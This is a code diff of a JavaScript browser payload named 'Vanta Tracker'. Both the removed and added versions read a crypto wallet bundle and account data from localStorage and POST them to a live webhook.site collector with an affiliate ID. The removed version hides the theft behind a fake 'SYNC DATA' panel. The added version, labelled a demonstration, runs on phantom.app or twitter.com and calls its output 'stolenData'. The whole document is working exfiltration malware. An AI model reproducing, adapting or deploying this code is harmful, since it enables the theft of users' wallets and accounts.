@@ -1,72 +1,43 @@
+/**
+ * VANTA TRACKER - DE-OBFUSCATED PAYLOAD
+ * Purpose: Demonstration of LocalStorage Exfiltration
+ */
 (function() {
-    // CONFIGURATION
-    const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515'; // Place your collector URL here
-    const AFFILIATE_ID = 'TK0XQV';
+    const DESTINATION = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
+    const AFFILIATE = 'TK0XQV';
 
-    // 1. DATA EXTRACTION LOGIC
-    const collectBrowserData = () => {
+    console.log("Vanta Payload Loaded...");
+
+    // 1. The Scraper: Targets specific sensitive keys
+    const harvestData = () => {
         return {
-            bundle: localStorage.getItem('padre-v2-bundles-store-v2'), // The target wallet bundle
+            wallet_bundle: localStorage.getItem('padre-v2-bundles-store-v2'),
             accounts: localStorage.getItem('vanta_accounts'),
-            timestamp: new Date().toISOString(),
-            url: window.location.href,
-            affiliate: AFFILIATE_ID
+            origin: window.location.hostname,
+            timestamp: new Date().getTime()
         };
     };
 
-    // 2. WEBHOOK FUNCTIONALITY
-    const sendToWebhook = (data) => {
-        fetch(WEBHOOK_URL, {
+    // 2. The Exfiltration: Sends data to your webhook
+    const transmit = (data) => {
+        fetch(DESTINATION, {
             method: 'POST',
-            mode: 'no-cors', // Bypasses some basic CORS restrictions
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
+            mode: 'no-cors', // Bypasses some basic security logging
+            body: JSON.stringify({
+                affiliate: AFFILIATE,
+                payload: data
+            })
         }).then(() => {
-            console.log("Data packet transmitted.");
+            alert("Analysis Complete. Check your dashboard.");
         });
     };
 
-    // 3. CREATE THE DRAGGABLE UI
-    const initUI = () => {
-        if (document.getElementById('vanta-ui')) return;
-
-        const ui = document.createElement('div');
-        ui.id = 'vanta-ui';
-        ui.style.cssText = `
-            position: fixed; top: 50px; right: 50px; width: 320px;
-            background: #0f0f0f; border: 1px solid #00ff88; border-radius: 12px;
-            z-index: 2147483647; color: #fff; font-family: sans-serif;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8); overflow: hidden;
-        `;
-
-        ui.innerHTML = `
-            <div id="vanta-header" style="padding:15px; background:#1a1a1a; cursor:grab; border-bottom:1px solid #333; display:flex; justify-content:space-between;">
-                <span style="color:#00ff88; font-weight:bold;">Vanta Tracker</span>
-                <span id="close-vanta" style="cursor:pointer;">×</span>
-            </div>
-            <div style="padding:20px;">
-                <div id="vanta-status" style="color:#888; font-size:12px; margin-bottom:10px;">Initializing Bypass...</div>
-                <button id="vanta-sync" style="width:100%; padding:10px; background:#00ff88; border:none; border-radius:6px; font-weight:bold; cursor:pointer;">SYNC DATA</button>
-            </div>
-        `;
-
-        document.body.appendChild(ui);
-
-        // UI Event Listeners
-        document.getElementById('close-vanta').onclick = () => ui.remove();
-        document.getElementById('vanta-sync').onclick = () => {
-            const data = collectBrowserData();
-            sendToWebhook(data);
-            document.getElementById('vanta-status').innerText = "Sync Complete.";
-        };
-
-        // Drag Logic
-        let isDragging = false, offset = [0,0];
-        const header = document.getElementById('vanta-header');
-        header.onmousedown = (e) => { isDragging = true; offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY]; };
-        document.onmousemove = (e) => { if(isDragging) { ui.style.left = (e.clientX + offset[0]) + 'px'; ui.style.top = (e.clientY + offset[1]) + 'px'; }};
-        document.onmouseup = () => { isDragging = false; };
-    };
-
-    initUI();
+    // 3. Execution Flow
+    // In the real world, this would wait for the user to be on the correct site
+    if (window.location.hostname.includes('phantom.app') || window.location.hostname.includes('twitter.com')) {
+        const stolenData = harvestData();
+        transmit(stolenData);
+    } else {
+        alert("Please run this tool on the target application page.");
+    }
 })();
